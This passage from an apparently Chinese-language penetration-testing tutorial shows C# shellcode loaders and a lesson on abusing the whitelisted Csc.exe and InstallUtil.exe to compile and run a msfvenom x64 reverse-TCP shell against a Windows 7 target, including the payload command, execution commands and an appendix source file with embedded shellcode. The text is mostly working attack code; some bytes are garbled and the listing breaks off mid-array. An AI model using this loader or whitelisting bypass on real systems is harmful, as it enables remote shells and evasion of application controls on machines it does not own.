<span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xdf</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">,</span>

<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>xba<span class="token punctuation">,</span>

<span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span>xe5<span class="token punctuation">,</span>

<span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>xc9<span class="token punctuation">,</span>

<span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">,</span>

<span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xe5</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span>x31<span class="token punctuation">,</span>

<span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span>xc8<span class="token punctuation">,</span>

<span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>x40<span class="token punctuation">,</span>

<span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">,</span>

<span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span>x3c<span class="token punctuation">,</span>

<span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xb5</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>xd5<span class="token punctuation">}</span><span class="token punctuation">;</span>

IntPtr AmnGaO <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>QWKpWKhcs<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>QWKpWKhcs<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>AmnGaO<span class="token punctuation">)</span><span class="token punctuation">,</span> QWKpWKhcs<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

IntPtr oXmoNUYvivZlXj <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span> UInt32 XVXTOi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> IntPtr pAeCTf wBS <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>

uint BnhanUiUJaetgy<span class="token punctuation">;</span>

bool iSdNUQK <span class="token operator">=</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>AmnGaO<span class="token punctuation">,</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token number">0x20</span><span class="token punctuation">,</span> out BnhanUiUJaetgy<span class="token punctuation">)</span><span class="token punctuation">;</span>

oXmoNUYvivZlXj <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> AmnGaO<span class="token punctuation">,</span> pAeCTfwBS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref XVXTOi<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>oXmoNUYvivZlXj<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="117_Cscexepayload_999"></a>11.7 基于白名单Csc.exe执行payload（七）</h2>
<p><strong>Csc.exe简介：</strong></p>
<p>C#的在Windows平台下的编译器名称是Csc.exe，如果你的.NET FrameWork SDK安装在C盘，那么你可以在C:\WINNT\Microsoft.NET\Framework\xxxxx目录中发现它。为了使用方便，你可以手动把这个目录添加到Path环境变量中去。用Csc.exe编译HelloWorld.cs非常简单，打开命令提示符，并切换到存放 test.cs文件的目录中，输入下列行命令:csc /target:exe test.cs 将Ttest.cs 编译成名为 test.exe 的 console 应用程序</p>
<p>说明： Csc.exe所在路径没有被系统添加PATH环境变量中，因此，csc命令无法识别。</p>
<p>基于白名单Csc.exe配置payload：</p>
<p><strong>Windows 7 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v2<span class="token punctuation">.</span><span class="token number">0.50727</span>\csc<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v2<span class="token punctuation">.</span><span class="token number">0.50727</span>\csc<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian<br>
靶机：192.168.1.5 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010151917100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>配置payload：</strong></p>
<pre><code class="prism language-c">msfvenom ‐p windows<span class="token operator">/</span>x64<span class="token operator">/</span>shell<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐ f csharp
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010151934327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
copy buf 到 Micropoor_Csc.cs shellcode 中。<br>
<img src="https://img-blog.csdnimg.cn/20201010151941249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\csc<span class="token punctuation">.</span>exe <span class="token operator">/</span>r<span class="token punctuation">:</span>System<span class="token punctuation">.</span>Ente rpriseServices<span class="token punctuation">.</span>dll <span class="token operator">/</span>r<span class="token punctuation">:</span>System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Compression<span class="token punctuation">.</span>dll <span class="token operator">/</span>target<span class="token punctuation">:</span>library <span class="token operator">/</span>out<span class="token punctuation">:</span>Mic opoor<span class="token punctuation">.</span>exe <span class="token operator">/</span>platform<span class="token punctuation">:</span>x64 <span class="token operator">/</span>unsafe C<span class="token punctuation">:</span>\Users\John\Desktop\Micropoor_Csc<span class="token punctuation">.</span>cs
</code></pre>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\InstallUtil<span class="token punctuation">.</span>exe <span class="token operator">/</span>logfile<span class="token operator">=</span> <span class="token operator">/</span>LogToConsole<span class="token operator">=</span>false <span class="token operator">/</span>U C<span class="token punctuation">:</span>\Users\John\Desktop\Micropoor<span class="token punctuation">.</span>exe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010152009753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
与第七十二课相比，payload更为灵活。</p>
<p><strong>附录：Micropoor_Csc.cs</strong></p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span> 


<span class="token comment">// msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f csharp </span>

public class Program

<span class="token punctuation">{</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span> 

<span class="token punctuation">}</span>


<span class="token punctuation">}</span> 

<span class="token punctuation">[</span>System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">.</span><span class="token function">RunInstaller</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">]</span>

public class Sample <span class="token punctuation">:</span> System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install<span class="token punctuation">.</span>Installer

<span class="token punctuation">{</span> 

public override <span class="token keyword">void</span> <span class="token function">Uninstall</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>IDictionary savedState<span class="token punctuation">)</span>

<span class="token punctuation">{</span> 

Shellcode<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">}</span> 

<span class="token punctuation">}</span> 

public class Shellcode

<span class="token punctuation">{</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span> 

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> shellcode <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">510</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>

<span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span>

<span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span>x48<span class="token punctuation">,</span>

<span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>xc9<span class="token punctuation">,</span>

<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0xed</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span>x48<span class="token punctuation">,</span>

<span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>x8b<span class="token punctuation">,</span>

<span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>x8b<span class="token punctuation">,</span>

<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd6</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>xc1<span class="token punctuation">,</span>

<span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span>x45<span class="token punctuation">,</span>

<span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0xd1</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>x8b<span class="token punctuation">,</span>

<span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>x01<span class="token punctuation">,</span>

<span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span>x48<span class="token punctuation">,</span>

<span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span>xe9<span class="token punctuation">,</span>

